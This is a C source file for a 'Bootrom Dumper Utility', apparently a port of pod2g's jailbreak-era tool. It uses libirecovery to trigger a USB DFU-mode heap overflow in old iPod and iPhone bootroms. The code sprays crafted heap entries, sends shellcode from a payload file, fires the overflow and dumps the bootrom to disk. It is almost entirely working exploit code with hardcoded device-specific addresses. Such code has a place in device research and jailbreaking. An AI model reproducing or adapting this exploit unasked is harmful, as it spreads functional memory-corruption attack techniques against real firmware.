// Bootrom Dumper Utility
// (c) pod2g october 2010
// port by Ra1ningSn0w 2012
//
// thanks to :
// - Chronic Dev Team for their support
// - geohot for limera1n

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <libirecovery.h>

#define LOADADDR	0x84000000
// A4:
//#define EXPLOIT_LR	0x8403BF9C
//#define LOADADDR_SIZE	0x2C000
// iPod 3G:
#define EXPLOIT_LR	0x84033F98
#define LOADADDR_SIZE	0x24000
// iPhone 3Gs:
//#define EXPLOIT_LR	0x84033FA4
//#define LOADADDR_SIZE	0x24000

int readfile(char *filename, void* buffer, unsigned int skip)
{
    FILE* file = fopen(filename, "rb");
	
	if (file == NULL)
	{
        printf("File %s not found.\n", filename);
        return 1;
    }
	
    fseek(file, 0, SEEK_END);
	
    int len = ftell(file);
	
    fseek(file, skip, SEEK_SET);
    fread(buffer, 1, len - skip, file);
    fclose(file);

	return len-skip;
}

int main(int argc, char *argv[])
{
	irecv_client_t client;
	irecv_error_t error;
	
	unsigned int i = 0, ret = 0;
	unsigned char data[0x800];
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = LOADADDR_SIZE;
	unsigned int stack_address = EXPLOIT_LR;
	unsigned int shellcode_address = LOADADDR + LOADADDR_SIZE - 0x1000 + 1;
	unsigned int shellcode_length = readfile("payload.bin", shellcode, 0);
	
	printf("______ Bootrom Dumper Utility (BDU) 1.0 ______\n");
	printf("\n");
	printf("                        (c) pod2g october 2010\n");
	printf("                    ported by Ra1ningSn0w 2012\n");
	printf("\n");

	irecv_init();
	
	error = irecv_open_attempts(&client, 10);

	if(error != IRECV_E_SUCCESS)
	{
		printf("[!] Connecting To Device Failed!\n");
		return 0;
	}
	
	if(client->mode != kDfuMode)
	{
		printf("[!] Please connect a device in DFU-Mode!\n");
	}
	else
	{
		printf("[!] Device in DFU-Mode connected!\n");
	}
	
	memset(buf, 0xCC, 0x800);
	
	for(i=0;i<0x800;i+=0x40) {
 		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}
	
	printf("[!] Sent data to copy: %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000));
	
	memset(buf, 0xCC, 0x800);
	
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800)
	{
		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}
	
	printf("\n[!] Padded to 0x%X\n", LOADADDR + LOADADDR_SIZE - 0x1000);
	
	printf("\n[!] Sent shellcode: %X has real length %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, shellcode_length));
	
	memset(buf, 0xBB, 0x800);
	
	printf("[!] never freed: %X\n", irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000));
	
	printf("[!] sent fake data to timeout: %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10));
	
	printf("[!] sent exploit to heap overflow: %X\n", irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000));
	
	irecv_reset(client);
	
	irecv_finish_transfer(client);
	
	irecv_reset(client);
	
	printf("[!] Dump payload started.\n");
	printf("[!] Now dumping bootrom to file bootrom.bin...\n");
	
	FILE * fOut = fopen("bootrom.bin", "wb");
	
	unsigned int addr = 0x0;
	
	do
	{
		ret = irecv_control_transfer(client, 0xA1, 2, 0, 0, data, 0x800, 100);
		if (ret < 0) break;
		fwrite(data, 1, 0x800, fOut);
		addr += 0x800;
	}
	while (addr < 0x10000);
        fclose(fOut);
	printf("[!] Done. Goodbye!\n");

	irecv_close(client);

	return 0;
}
